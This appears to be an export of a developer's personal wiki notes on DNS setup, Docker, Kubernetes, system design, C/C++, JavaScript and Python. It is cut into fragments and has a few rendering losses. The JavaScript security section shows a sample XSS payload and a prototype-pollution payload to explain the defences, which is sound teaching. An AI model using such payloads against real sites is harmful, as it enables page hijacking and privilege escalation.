When you type google.com, you are asking a specific server to translate that human-readable name into a machine-readable IP address (142.250.190.46).\nControl the DNS, and you control the traffic.\n\n\n1. How DNS Works (The Query Lifecycle)\n[Image of DNS Query Resolution Steps]\nWhen you request wiki.habibullah.dev, the following happens:\n\nStub Resolver (Your PC): Checks local cache (/etc/hosts or OS cache). If missing, asks the Recursive Resolver.\nRecursive Resolver (ISP/Cloudflare): The workhorse. It asks the Root Server (.).\nRoot Server: “I don’t know, but .dev is managed by Google Registry. Go ask them.”\nTLD Server (.dev): “I don’t know, but habibullah.dev is managed by Cloudflare. Go ask them.”\nAuthoritative Server (Cloudflare): “Yes, I know that specific subdomain. The IP is 104.21.65.200.”\nAnswer: The IP is sent back to your PC.\n\n\n2.

Overwriting Global DNS (Linux/Fedora) 🐧\nBy default, Linux gets its DNS from your Router (DHCP). This is often slow and insecure. We want to force it to use Cloudflare (1.1.1.1) or Google (8.8.8.8).\nMethod A: The Temporary Fix (/etc/resolv.conf)\nNote: This file is usually overwritten by NetworkManager on reboot.\nsudo nano /etc/resolv.conf\n# Add these lines\nnameserver 1.1.1.1\nnameserver 1.0.0.1\nMethod B: The Permanent Fix (Systemd-Resolved)\nModern Fedora uses systemd-resolved.\n\n\nEdit the config:\nBash\nsudo nano /etc/systemd/resolved.conf\n\n\n\nUncomment and set DNS:\nIni, TOML\n[Resolve]\nDNS=1.1.1.1 1.0.0.1\n# FallbackDNS=8.8.8.8\n# Domains=~.\n\n\n\nRestart the service:\nBash\nsudo systemctl restart systemd-resolved\n\n\n\nVerify:\nBash\nresolvectl status\n\n\n\nMethod C: NetworkManager (GUI/CLI)\nThis sets it per-connection (e.g., specifically for your WiFi).\nBash\n# List connections\nnmcli connection show\n\n# Modify (Replace &#039;WiFi-Name&#039; with your actual connection name)\nnmcli connection modify &quot;WiFi-Name&quot; ipv4.dns &quot;1.1.1.1 1.0.0.1&quot;\nnmcli connection modify &quot;WiFi-Name&quot; ipv4.ignore-auto-dns yes\n\n# Apply\nnmcli connection up &quot;WiFi-Name&quot;\n\n\n4. Overwriting Global DNS (Windows) 🪟\nWindows hides this deep in menus, but PowerShell is faster.\nMethod A: The GUI Way\n\n\nRun: ncpa.cpl (Opens Network Connections).\n\n\nRight-click your Adapter (WiFi/Ethernet) \\to Properties.\n\n\nSelect Internet Protocol Version 4 (TCP/IPv4) \\to Properties.\n\n\nSelect “Use the following DNS server addresses”:\n\n\nPreferred: 1.1.1.1\n\n\nAlternate: 1.0.0.1\n\n\n\n\nMethod B: The PowerShell Way (Admin)\nThis is instant and scriptable.\nPowerShell\n# 1.

Clear Cache\nClear-DnsClientCache\n\n\n5. Advanced: Encrypted DNS (DoH / DoT) 🛡️\nStandard DNS is cleartext. Your ISP (and hackers on public WiFi) can see every site you visit.\nDNS over HTTPS (DoH)\nEncapsulates DNS queries inside regular HTTPS traffic (Port 443). To the ISP, it looks like regular web browsing.\nEnabling in Firefox:\n\nSettings \\to Privacy &amp; Security \\to DNS over HTTPS \\to Max Protection (Cloudflare).\n\nEnabling in Windows 11:\n\nSettings \\to Network &amp; Internet \\to Wi-Fi \\to Hardware Properties \\to DNS Server Assignment \\to Edit \\to Encrypted DNS (On).\n\n\n6.

This guide moves beyond docker run and explores the architecture, networking, storage patterns, and security practices required for production-grade engineering.\n\n\n1. The Architecture (Under the Hood)\nAt its core, Docker is a wrapper around Linux Kernel primitives. It does not “virtualize” hardware like a VM; it “isolates” processes.\nKernel Namespaces &amp; Cgroups\nWhen you start a container, Docker leverages two key Linux features:\n\nNamespaces: Provide isolation. The process thinks it has its own PID tree, Network stack, and Mount points.\nControl Groups (cgroups): Provide resource limiting. Prevents a container from eating 100% of your CPU or RAM.\n\n\n2. Installation on Fedora (JUICE)\nSince we are running Fedora, we use the official repository for the latest version.\n# 1. Remove old versions (if any)\nsudo dnf remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-selinux \\\n                  docker-engine-selinux \\\n                  docker-engine\n \n# 2. Add the repo\nsudo dnf -y install dnf-plugins-core\nsudo dnf config-manager --add-repo [download.docker.com/linux/fedora/docker-ce.repo](download.docker.com/linux/fedora/docker-ce.repo)\n \n# 3. Install\nsudo dnf install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n \n# 4. Start &amp; Enable\nsudo systemctl start docker\nsudo systemctl enable docker\n \n# 5. Post-Install (Run without sudo)\nsudo usermod -aG docker $USER\nnewgrp docker\n\n\n                  \n                  Security Note \n                  \n                \n\nAdding your user to the docker group is equivalent to giving yourself root privileges. Ensure you trust the code you run. For higher security, look into Rootless Docker.\n\n\n\n3. The Image Hierarchy (Layers)\nDocker images are read-only templates built from a series of layers.\n\n\nUnion File System (UnionFS): Docker stacks layers on top of each other.\n\n\nCopy-on-Write (CoW): When a container modifies a file, it creates a copy of that file in the top “writable” layer. The underlying image remains untouched.\n\n\nThe Dockerfile Anatomy\nA well-optimized Dockerfile is an art form.\nDockerfile\n# 1. Base Image (Use Alpine or Slim for size)\nFROM node:20-alpine\n\n# 2. Set Working Directory\nWORKDIR /app\n\n# 3. Install Dependencies (Layer Caching Strategy)\n# Copy package.json BEFORE source code.\n# Docker will cache this layer if package.json hasn&#039;t changed.\nCOPY package*.json ./\nRUN npm install\n\n# 4. Copy Source Code\nCOPY . .\n\n# 5. Documentation (Expose Port)\nEXPOSE 3000\n\n# 6. Runtime Command\nCMD [&quot;npm&quot;, &quot;start&quot;]\n\n\n4. Advanced: Multi-Stage Builds\nThis is how you shrink a 1GB image down to 50MB. You build in one environment and ship in another.\nScenario: A Next.js Application.\nDockerfile\n# --- Stage 1: The Builder ---\nFROM node:18-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n# --- Stage 2: The Runner (Production) ---\nFROM node:18-alpine AS runner\nWORKDIR /app\nENV NODE_ENV production\n\n# Don&#039;t run as root!\nRUN addgroup --system --gid 1001 nodejs\nRUN adduser --system --uid 1001 nextjs\n\n# Copy ONLY the build artifacts from Stage 1\nCOPY --from=builder /app/public ./public\nCOPY --from=builder --chown=nextjs:nodejs /app/.next/standalone ./\nCOPY --from=builder --chown=nextjs:nodejs /app/.next/static ./.next/static\n\nUSER nextjs\n\nEXPOSE 3000\nCMD [&quot;node&quot;, &quot;server.js&quot;]\n\n\n\n                  \n                  Why this matters \n                  \n                \n\nBy discarding the node_modules used for building and keeping only the production files, we reduce attack surface and deployment time.\n\n\n\n5. Storage Patterns (Persistence)\nContainers are ephemeral (temporary). If you delete a container, the data inside is gone.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTypeSyntaxUse CaseVolume-v my_vol:/dataPreferred. Managed by Docker. stored in /var/lib/docker/volumes. Best for DBs.Bind Mount-v $(pwd):/appDev Mode. Maps a folder on your host to the container. Great for live reloading code.Tmpfs--tmpfs /appSecurity. Stored in RAM only. Good for secrets/keys.\n\n6. Networking\nDocker creates a bridge network by default.\n\n\nBridge: Default. Containers talk via IP addresses.\n\n\nHost: Removes isolation. Container shares localhost with the Fedora host. (Fastest, but dangerous).\n\n\nOverlay: Used in Swarm/Kubernetes for multi-host communication.\n\n\nDNS Magic:\nIn a custom network (docker network create my-net), containers can resolve each other by name.\nping postgres-db works inside the backend container automatically.\n\n7. Orchestration: Docker Compose\nManaging 5 containers with CLI flags is madness. We use compose.yaml.\nYAML\nversion: &#039;3.8&#039;\n\nservices:\n  # The Backend\n  api:\n    build: ./backend\n    ports:\n      - &quot;5000:5000&quot;\n    environment:\n      - DB_HOST=db\n      - DB_PASSWORD=secret\n    depends_on:\n      - db\n    networks:\n      - app-net\n\n  # The Database\n  db:\n    image: postgres:15-alpine\n    restart: always\n    environment:\n      POSTGRES_PASSWORD: secret\n    volumes:\n      - db_data:/var/lib/postgresql/data\n    networks:\n      - app-net\n\nvolumes:\n  db_data:\n\nnetworks:\n  app-net:\n\n\n8. Security Hardening (The Hacker Mindset) 🛡️\n\n\nNever Run as Root: Always define a USER in your Dockerfile (like the Multi-stage example above).\n\n\nRead-Only Filesystem: Use --read-only to prevent attackers from writing malicious scripts.\n\n\nCapabilities: Drop Linux capabilities you don’t need.\nBash\ndocker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE my-app\n\n\n\nImage Scanning: Use tools like Trivy or Grype to scan images for CVEs before deployment.\nBash\ntrivy image my-app:latest\n\n\n\n\n9.

Kubernetes manages clusters of machines.\nIt answers the hard questions: What if a server crashes? How do I upgrade without downtime? How do I scale from 1 to 1000 instances?\n\n\n1. The Architecture (The Cluster)\nA K8s cluster is split into two parts: The Brain (Control Plane) and the Muscle (Worker Nodes).\n🧠 The Control Plane (Master Node)\n\nAPI Server (kube-apiserver): The gatekeeper. Every command (kubectl) goes here. It authenticates and validates requests.\netcd: The database. A highly available key-value store that keeps the entire state of the cluster. If you lose etcd, you lose the cluster.\nScheduler: Decides where to put a new Pod based on CPU/RAM availability.\nController Manager: The “loop” that watches the state. If you asked for 3 replicas and one dies, this guy notices and orders a replacement.\n\n💪 The Worker Nodes\n\nKubelet: The agent running on every node. It talks to the API Server and says “I am alive” and starts containers.\nKube-proxy: Handles the networking. Maintains network rules (IP tables) so traffic finds the right pod.\nContainer Runtime: The engine that actually runs the code (usually containerd or Docker).\n\n\n2. Core Concepts (The API Objects)\nThe Pod (Atomic Unit)\n\n\n                  \n                  K8s does not run Containers. \n                  \n                \n\nK8s runs Pods. A Pod is a wrapper around one (or more) containers.\n\n\n\nContainers in the same Pod share Localhost and Storage volumes.\nAnalogy: The Pod is the “Laptop”, the Containers are the “Apps” running on it.\n\nThe Deployment (Replica Manager)\nYou rarely create a Pod directly. You create a Deployment.\nA Deployment ensures that N copies of your Pod are always running. It handles Rolling Updates (updating version v1 to v2 with zero downtime).\nThe Service (Networking)\nPods are ephemeral (they die and get new IPs). A Service provides a stable, permanent IP address (VIP) to access a group of Pods.\n\nClusterIP: Internal only (default).\nNodePort: Opens a port on the physical server (e.g., 30007).\nLoadBalancer: Requests a public IP from the Cloud Provider (AWS/GCP).\n\n\n3. The “Declarative” Workflow (YAML)\nIn K8s, we don’t tell the system what to do (“Start server”). We tell it what we want (“I want 3 servers”). This is Infrastructure as Code.\nProduction YAML Example\nSave this as app.yaml:\n# 1. The Deployment (The Application)\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-web-app\nspec:\n  replicas: 3               # I want 3 copies\n  selector:\n    matchLabels:\n      app: frontend\n  template:                 # The Pod Blueprint\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.21-alpine\n        ports:\n        - containerPort: 80\n        resources:          # LIMITS ARE CRITICAL\n          limits:\n            memory: &quot;128Mi&quot;\n            cpu: &quot;500m&quot;\n \n---\n# 2. The Service (The Entrypoint)\napiVersion: v1\nkind: Service\nmetadata:\n  name: frontend-svc\nspec:\n  selector:\n    app: frontend           # Point to the Pods labeled &#039;frontend&#039;\n  ports:\n    - protocol: TCP\n      port: 80              # Service Port\n      targetPort: 80        # Container Port\n  type: ClusterIP\nApply it:\nBash\nkubectl apply -f app.yaml\n\n\n4. kubectl Cheat Sheet (The Control Stick)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nActionCommandCheck Nodeskubectl get nodesCheck Podskubectl get pods -o wideView Logskubectl logs -f &lt;pod-name&gt;Shell Accesskubectl exec -it &lt;pod-name&gt; -- shDescribe Errorkubectl describe pod &lt;pod-name&gt;Delete Allkubectl delete -f app.yaml\n\n\n                  \n                  Auto-completion \n                  \n                \n\nOn Fedora, install bash-completion: echo ‘source &lt;(kubectl completion bash)’ &gt;&gt; ~/.bashrc\n\n\n\n5. Helm (The Package Manager)\nWriting 500 lines of YAML is painful. Helm is the “apt/dnf” for Kubernetes.\n\n\ninstead of writing YAML, you run:\nhelm install my-db bitnami/postgresql\n\n\nIt uses “Charts” (templates) to manage complex apps.\n\n\n\n6. Security (The “Gotchas”) 🛡️\n\n\nSecrets are not Secret: By default, K8s Secrets are just base64 encoded strings stored in etcd. Anyone with API access can decode them. Fix: Enable Encryption at Rest in etcd.\n\n\nNetwork Policies: By default, all pods can talk to all pods (Flat network). Use NetworkPolicy to act as a firewall between your DB and your Frontend.\n\n\nRBAC (Role Based Access Control): Never give developers cluster-admin. Give them Role bindings restricted to their specific Namespace.\n\n\n\nLinked Notes\n\n\nDocker-Ultimate-Guide - K8s runs these images.\n\n\nLinux-Kernel-Internals - Kube-proxy uses iptables/eBPF.\n\n\nFedora-Workstation - My local minikube or kind setup.\n\n"},"DevOps/System-Design-Basics":{"slug":"DevOps/System-Design-Basics","filePath":"DevOps/System-Design-Basics.md","title":"System Design 101 - The Architecture of Scale","links":["DevOps/Kubernetes-Basics","DevOps/Docker-Ultimate-Guide","Security/SQL-Injection-Methodology"],"tags":["system-design","architecture","scalability","database","interview","LLM"],"content":"\n\n                  \n                  The Golden Rule \n                  \n                \n\n“It Depends.”\nEvery architectural decision is a trade-off. You trade consistency for availability. You trade latency for throughput. You trade development speed for performance.\n\n\n1. Core Concepts (The Non-Negotiables)\nScalability\nThe ability of a system to cope with increased load (users, data, requests).\n\nVertical Scaling (Scale Up): Buying a bigger machine (More RAM, better CPU).\n\nPros: Simple. No code changes.\nCons: Hard limit (Hardware cap). Single Point of Failure (SPOF).\n\n\nHorizontal Scaling (Scale Out): Buying more machines.\n\nPros: Infinite theoretical scale. Resilient.\nCons: Complexity. Distributed data consistency issues.\n\n\n\nReliability\nThe probability that the system performs correctly during a specific time.\n\nAvailability: Availability = \\frac{Uptime}{Uptime + Downtime}\n\n99.9% (3 nines): ~8.7 hours downtime/year.\n99.999% (5 nines): ~5 minutes downtime/year (The Holy Grail).\n\n\n\n\n2. Load Balancing (The Traffic Cop)\nA Load Balancer (LB) sits between the client and the server farm. It distributes requests to prevent any single server from crashing.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTypeLayer (OSI)DescriptionExampleL4 LBTransportRoutes based on IP + Port. “Dumb” but ultra-fast.HAProxy (TCP mode)L7 LBApplicationRoutes based on URL, Headers, Cookies. Smart logic.NGINX, AWS ALB\n\n\n                  \n                  Algorithms \n                  \n                \n\n\nRound Robin: Circular order (1 → 2 → 3 → 1).\nLeast Connections: Send to the server with fewest active users.\nConsistent Hashing: Critical for Distributed Caching. Ensures user X always goes to Server Y.\n\n\n\n\n3. Databases: The Storage Layer 💾\nThe biggest bottleneck in 99% of systems.\nSQL vs. NoSQL\n\nRelational (SQL): Structured, strict schema, ACID transactions.\n\nUse case: Banking, Inventory, User Auth. (PostgreSQL, MySQL)\n\n\nNon-Relational (NoSQL): Unstructured, flexible, high throughput.\n\nUse case: Social feeds, Analytics, IoT logs. (MongoDB, Cassandra, Redis)\n\n\n\nThe CAP Theorem\nIn a distributed data store, you can only pick two of these three:\n\nConsistency: Every read receives the most recent write or an error.\nAvailability: Every request receives a (non-error) response, without the guarantee that it contains the most recent write.\nPartition Tolerance: The system continues to operate despite an arbitrary number of messages being dropped/delayed by the network between nodes.\n\n\n\n                  \n                  Reality Check \n                  \n                \n\nIn a distributed system (like the Cloud), Partition Tolerance (P) is unavoidable. Networks fail.\nSo, you really only have a choice between CP (Banking systems - fail if network breaks) or AP (Facebook likes - show old data if network breaks).\n\n\n[Image of CAP Theorem diagram]\n\n4. Caching (The Speed Cheat Code) ⚡\nCaching involves saving the result of an expensive computation/query in fast memory (RAM) closer to the user.\n\nClient Caching: Browser Cache, Cookies.\nCDN (Content Delivery Network): Caches static assets (images, CSS) at the “Edge” (servers physically close to the user). Cloudflare.\nServer Caching: Redis or Memcached. Stores DB query results.\n\nCaching Strategies:\n\nCache-Aside: Application checks Cache first. If empty, check DB, then update Cache. (Most common).\nWrite-Through: Write to Cache and DB simultaneously. (Data consistency is high, write is slow).\n\n\n5. Communication Protocols\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nProtocolTypeUse CaseHTTP/RESTRequest/ResponseStandard web APIs. Human readable.gRPCRPC (Binary)Microservice-to-Microservice. Ultra-fast (Protobufs).WebSocketFull DuplexReal-time chat, Live Dashboards (Socket.IO).GraphQLQuery LanguageFrontend needs specific data shape. Prevents over-fetching.\n\n6. Asynchronous Processing (Decoupling)\nIf a user uploads a video, do not make them wait for the transcoding to finish.\nUse a Message Queue.\n\nProducer: User uploads video. API sends message to Queue. Returns “Upload Successful”.\nQueue: Kafka or RabbitMQ holds the message.\nConsumer: A worker server picks up the message, processes the video, and updates the DB hours later.\n\nBenefit: If the traffic spikes, the Queue buffers the requests so your servers don’t crash.\n\n7. The “Twitter” Thought Experiment\nDesign a generic social media feed.\n\nUser posts a tweet:\n\nWrite to DB (SQL for user data, NoSQL for the tweet text).\nFan-out: Push the tweet ID to the “Feed Cache” (Redis) of every follower.\n\n\nUser views feed:\n\nDo not query the DB: SELECT * FROM tweets WHERE user_id IN (following_list).

It does not stop you from accessing invalid memory. It is a razor-sharp tool that gives you direct access to the hardware.\n\nIf you want to build a Web App, use JavaScript.\nIf you want to build the Browser that runs the Web App, use C/C++.\n\n\n\n1. The Compilation Process (Under the Hood) ⚙️\nWhen you run gcc main.c, four distinct steps happen.\n\nPreprocessing (.i): Handles #include and #define. It essentially copy-pastes header files into your source.\nCompilation (.s): Translates C code into Assembly instructions specific to your CPU architecture (x86_64).\nAssembly (.o): Translates Assembly into Machine Code (Binary). This is the “Object File”.\nLinking (a.out): Combines your object file with standard libraries (libc) to create the final executable.\n\n# See the steps manually\ngcc -E main.c -o main.i   # Preprocess\ngcc -S main.i -o main.s   # Compile\ngcc -c main.s -o main.o   # Assemble\ngcc main.o -o main        # Link\n\n2.

Structs &amp; Unions 🏗️\nStructs (Grouping Data)\nThe precursor to Classes.\nC\nstruct Point {\n    int x;\n    int y;\n};\n\nstruct Point p1 = {10, 20};\n\nUnions (Memory Efficiency)\nAll members share the same memory location. Useful for embedded systems or low-level type punning.\nC\nunion Data {\n    int i;\n    float f;\n};\n// Only &#039;i&#039; OR &#039;f&#039; can be used at one time. \n// Writing to &#039;f&#039; overwrites &#039;i&#039;.\n\n\n6. System Calls (Talking to the Kernel) 🐧\nStandard C (printf) wraps System Calls (write). A Systems Engineer uses the Syscalls directly for performance.\nC\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n\nvoid lowLevelIO() {\n    // 1. Open File (Syscall)\n    int fd = open(&quot;test.txt&quot;, O_WRONLY | O_CREAT, 0644);\n    \n    if (fd == -1) return; // Error\n    \n    // 2.

Memory Management (The Interview Killer) 🧠\nThis is what separates a Coder from an Engineer.\nStack vs Heap\n\nStack: Fast, automatic, small size. Variables declared inside functions.\nHeap: Slow, manual, huge size. Created with new or malloc.\n\nThe Old Way (Raw Pointers) - Dangerous\nint* ptr = new int(10); // Allocates on Heap\ndelete ptr;             // MUST delete, or Memory Leak happens\nptr = nullptr;          // Good practice to prevent dangling pointer\nThe Modern Way (Smart Pointers) - Safe\nAlways use these in production code. (RAII Principle: Resource Acquisition Is Initialization).\n#include &lt;memory&gt;\n \nvoid smartPointers() {\n    // 1. unique_ptr (Exclusive Ownership)\n    // Automatically deletes memory when it goes out of scope.\n    std::unique_ptr&lt;int&gt; ptr1 = std::make_unique&lt;int&gt;(10);\n    \n    // 2. shared_ptr (Shared Ownership)\n    // Uses Reference Counting.

Object Oriented Programming (OOP) 🏗️\nThe Big 4 Concepts\n\nEncapsulation: Hiding data (private/public).\nAbstraction: Hiding complexity.\nInheritance: class Dog : public Animal.\nPolymorphism: The ability to treat different objects as a common type.\n\nVirtual Functions &amp; V-Tables\nThis is the most asked C++ interview question.\n\nProblem: How does C++ know which function to call at runtime?\nSolution: The V-Table (Virtual Table). A hidden pointer table created for classes with virtual functions.\n\n\nclass Shape {\npublic:\n    // &quot;virtual&quot; enables Runtime Polymorphism\n    virtual void draw() { \n        std::cout &lt;&lt; &quot;Drawing Shape&quot;; \n    }\n    // Pure Virtual Function (Makes this an Abstract Class/Interface)\n    virtual void area() = 0; \n    \n    // ALWAYS make destructor virtual in base classes!\n    virtual ~Shape() {}\n};\n \nclass Circle : public Shape {\npublic:\n    void draw() override { // &quot;override&quot; keyword ensures safety\n        std::cout &lt;&lt; &quot;Drawing Circle&quot;; \n    }\n    void area() override {\n        // calculate area\n    }\n};\n \nvoid render(Shape* s) {\n    s-&gt;draw(); // Calls Circle::draw() if s points to a Circle\n}\n\n5.

Unlike Python, it runs in the browser. Unlike Java, it uses Prototypes, not Classes.\n\n\n1. The Runtime (Under the Hood) ⚙️\nJavaScript does not run alone. It runs inside a Host Environment (Browser or Node.js). The most famous engine is Google’s V8 (written in C++).\nMemory Heap &amp; Call Stack\n\nMemory Heap: Unstructured memory where objects and variables are allocated. Garbage Collection (Mark &amp; Sweep) happens here.\nCall Stack: Where the code actually executes. JS is Single Threaded, meaning it has only ONE stack. It can only do one thing at a time.\n\nThe Event Loop (How Async Works)\nIf JS is single-threaded, how does setTimeout or fetch work without freezing the UI?\nAnswer: The Event Loop.\n\nCall Stack: Runs synchronous code (e.g., console.log).\nWeb APIs (Browser) / C++ APIs (Node): When you call setTimeout, the stack hands it off to the Web API. The timer runs outside the JS thread.\nCallback Queue (Task Queue): When the timer finishes, the callback is pushed here.\nThe Loop: The Event Loop checks: Is the Stack empty? If yes, it pushes the first item from the Queue to the Stack.\n\n\n\n                  \n                  Interview Question \n                  \n                \n\nMicrotasks vs Macrotasks:\n\nMicrotasks: Promises (.then), queueMicrotask. High Priority.\nMacrotasks: setTimeout, setInterval. Low Priority.\nThe Engine drains the entire Microtask queue before running a single Macrotask.\n\n\n\n\n2.

Types &amp; Coercion (The “Wat” Moments)\nPrimitives (Stack)\nstring, number, boolean, null, undefined, symbol, bigint.\n\nPassed by Value.\n\nReference Types (Heap)\nObject, Array, Function.\n\nPassed by Reference (Pointer).\n\nJavaScript\n// Reference Copying\nlet a = [1, 2];\nlet b = a; // b points to the same memory address as a\nb.push(3);\nconsole.log(a); // [1, 2, 3] - &#039;a&#039; changed!\n\nCoercion (Implicit Casting)\nThe engine tries to be helpful, often with disastrous results.\nJavaScript\n1 + &quot;2&quot;   // &quot;12&quot;  (String concatenation)\n&quot;5&quot; - 1   // 4     (Math subtraction)\n[] + []   // &quot;&quot;    (Arrays to string is &quot;&quot;, &quot;&quot; + &quot;&quot; = &quot;&quot;)\n[] == ![] // true  (Don&#039;t ask.)\n\n\n\n                  \n                  Rule \n                  \n                \n\nAlways use = (Strict Equality) which checks Type and Value. Never use .\n\n\n\n4. Functions &amp; Closures 🔒\nFirst-Class Citizens\nFunctions are just objects. You can pass them as arguments, return them, and assign properties to them.\nClosures\nA closure is a function that “remembers” its outer variables even after the outer function has returned. It is like a backpack of data.\nJavaScript\nfunction createCounter() {\n    let count = 0; // &quot;Private&quot; variable\n    return function() {\n        count++;\n        return count;\n    }\n}\n\nconst counter = createCounter();\nconsole.log(counter()); // 1\nconsole.log(counter()); // 2\n// You cannot access &#039;count&#039; directly from here.\n\nThe this Keyword\nThe value of this depends on how the function is called, not where it is defined.\n\n\nGlobal: window (or undefined in strict mode).\n\n\nObject Method: The object itself.\n\n\nConstructor: The new instance.\n\n\nArrow Function: Inherits this from the parent scope (Lexical Scoping). This is why we use Arrow functions in React.\n\n\n\n5. Prototypes (OOP in JS) 🧬\nJavaScript does not have Classes (internally). It has Prototypes.\nWhen you look for a property on an object, if it’s not found, JS looks at the object’s proto, then that object’s proto, all the way to null.\nJavaScript\n// The &quot;Old&quot; Way\nfunction Dog(name) {\n    this.name = name;\n}\nDog.prototype.bark = function() {\n    console.log(&quot;Woof!&quot;);\n}\n\n// The &quot;New&quot; Way (Syntactic Sugar)\nclass Dog {\n    constructor(name) {\n        this.name = name;\n    }\n    bark() {\n        console.log(&quot;Woof!&quot;);\n    }\n}\n\nNote: Under the hood, the class version compiles down to the prototype version.\n\n6. Asynchronous Programming ⏳\nPhase 1: Callback Hell\nNesting functions inside functions.\nJavaScript\ngetData(function(a) {\n    getMore(a, function(b) {\n        // ...\n    });\n});\n\nPhase 2: Promises (ES6)\nA placeholder for a future value.\n\nStates: Pending → Resolved OR Rejected.\n\nPhase 3: Async / Await (ES8)\nMakes async code look synchronous.\nJavaScript\nasync function fetchData() {\n    try {\n        const response = await fetch(&#039;/api/user&#039;);\n        const data = await response.json();\n        console.log(data);\n    } catch (error) {\n        console.error(&quot;Failed&quot;, error);\n    }\n}\n\n\n7. Modern JS Patterns (ES6+) ✨\nDestructuring\nJavaScript\nconst user = { id: 1, name: &quot;Habib&quot;, role: &quot;Admin&quot; };\nconst { name, role } = user; // Extract variables\n\nSpread Operator (…)\nJavaScript\nconst arr1 = [1, 2];\nconst arr2 = [...arr1, 3, 4]; // [1, 2, 3, 4]\nconst clone = { ...user }; // Shallow copy of object\n\nModules (ESM)\nJavaScript\n// lib.js\nexport const add = (a, b) =&gt; a + b;\n\n// main.js\nimport { add } from &#039;./lib.js&#039;;\n\n\n8. Security (The Hacker Angle) 🛡️\nXSS (Cross-Site Scripting)\nIf you trust user input, they can inject JS into your site.\n\n\nAttack: &lt;img src=x onerror=alert(1)&gt;\n\n\nDefense: Always escape HTML. Use textContent instead of innerHTML. Use React (which escapes by default).\n\n\nPrototype Pollution\nA vulnerability specific to JS. If an attacker can modify Object.prototype, they can affect every object in the application.\nJavaScript\n// Malicious payload\nlet payload = JSON.parse(&#039;{&quot;__proto__&quot;: {&quot;isAdmin&quot;: true}}&#039;);\n// Merging this into an object might pollute the global prototype\n\n\nLinked Notes\n\n\nNode-Backend-Architecture\n\n\nReact-Deep-Dive\n\n\nWeb-Security-Basics\n\n\nC-Programming - Comparing V8 (C++) to JS.\n\n"},"Development/Python-Advanced":{"slug":"Development/Python-Advanced","filePath":"Development/Python-Advanced.md","title":"Python Advanced - Internals & Architecture","links":["Development/C-Programming","Linux-Special/Linux-Basics","DevOps/Docker-Ultimate-Guide"],"tags":["python","backend","automation","scripting","performance"],"content":"\n\n                  \n                  The Philosophy \n                  \n                \n\nPython is “Executable Pseudocode.” It prioritizes developer productivity over raw machine performance.\nHowever, a Senior Engineer knows how to peek under the hood to make it fly.\n\n\n1. The Global Interpreter Lock (GIL) 🔒\nFor decades, the GIL was the villain of Python. It prevented multiple threads from executing Python bytecodes at once, meaning multithreading was useless for CPU-bound tasks.\nThe Revolution (Python 3.13+)\nSince you are on Python 3.14, you have access to Free-Threading.\n\nOld World: Threads share the GIL. Only one runs at a time.\nNew World: The GIL is optional (experimental build). True parallelism is possible.\n\nConcurrency Strategy:\n\nI/O Bound (Network/Disk): Use asyncio or threading.\nCPU Bound (Math/Data): Use multiprocessing (Process-based isolation) or the new Free-Threading mode.\n\n\n2. Asyncio (The Event Loop) ⏳\nPython’s answer to Node.js. It allows you to handle thousands of connections on a single thread.\nimport asyncio\n \nasync def fetch_data(id):\n    print(f&quot;Fetching {id}...&quot;)\n    await asyncio.sleep(1) # Simulates Network Request (Non-blocking)\n    print(f&quot;Done {id}&quot;)\n    return {&quot;id&quot;: id}\n \nasync def main():\n    # Run tasks concurrently\n    results = await asyncio.gather(\n        fetch_data(1),\n        fetch_data(2),\n        fetch_data(3)\n    )\n    print(results)\n \nif __name__ == &quot;__main__&quot;:\n    asyncio.run(main())\n\n3. Metaprogramming (Code that writes Code) 🪄\nDecorators\nWrappers that modify the behavior of a function without changing its source code. Critical for things like Authentication or Logging.\nPython\nfrom functools import wraps\nimport time\n\ndef timer(func):\n    @wraps(func) # Preserves metadata (name, docstring)\n    def wrapper(*args, **kwargs):\n        start = time.time()\n        result = func(*args, **kwargs)\n        end = time.time()\n        print(f&quot;{func.__name__} took {end - start:.4f}s&quot;)\n        return result\n    return wrapper\n\n@timer\ndef heavy_computation():\n    time.sleep(0.5)\n\nheavy_computation()\n\nMetaclasses\nClasses are objects too. A Metaclass is the “Class of a Class.” It controls how classes are created.\n\n\nDefault: type is the default metaclass.\n\n\nUse Case: Enforcing coding standards (e.g., ensuring all class names are CamelCase) or Singleton patterns.\n\n\n\n4. Memory Management 🧠\nReference Counting + Garbage Collection\nPython uses Reference Counting as its primary mechanism.\n\n\nRef Count &gt; 0: Object lives.\n\n\nRef Count = 0: Object destroyed immediately.\n\n\nThe Cyclic GC:\nIf Object A points to B, and B points to A, their ref count never hits 0. Python’s Cyclic Garbage Collector runs periodically (Generation 0, 1, 2) to find and kill these isolated islands of memory.\n__slots__ Optimization\nBy default, Python objects store attributes in a dict (Hash Map). This is memory expensive.\nUsing slots tells Python to use a static C-struct-like array instead.\nPython\nclass Point:\n    __slots__ = [&#039;x&#039;, &#039;y&#039;] # No __dict__ created. Saves RAM.\n    \n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n\nImpact: 40-50% memory reduction for classes with millions of instances.\n\n\n5. Modern Python Features (3.10+) 🚀\nStructural Pattern Matching (match/case)\nSwitch statements on steroids.\nPython\ndef http_handler(response):\n    match response:\n        case {&quot;status&quot;: 200, &quot;body&quot;: data}:\n            return f&quot;Success: {data}&quot;\n        case {&quot;status&quot;: 404}:\n            return &quot;Not Found&quot;\n        case {&quot;status&quot;: 500} | {&quot;status&quot;: 503}:\n            return &quot;Server Error&quot;\n        case _:\n            return &quot;Unknown&quot;\n\nType Hinting (Static Analysis)\nPython is dynamic, but large codebases need structure. Use Mypy or Pyright to enforce these.\nPython\nfrom typing import List, Optional\n\n# The hints do nothing at runtime, but catch bugs during dev\ndef process_items(items: List[str]) -&gt; 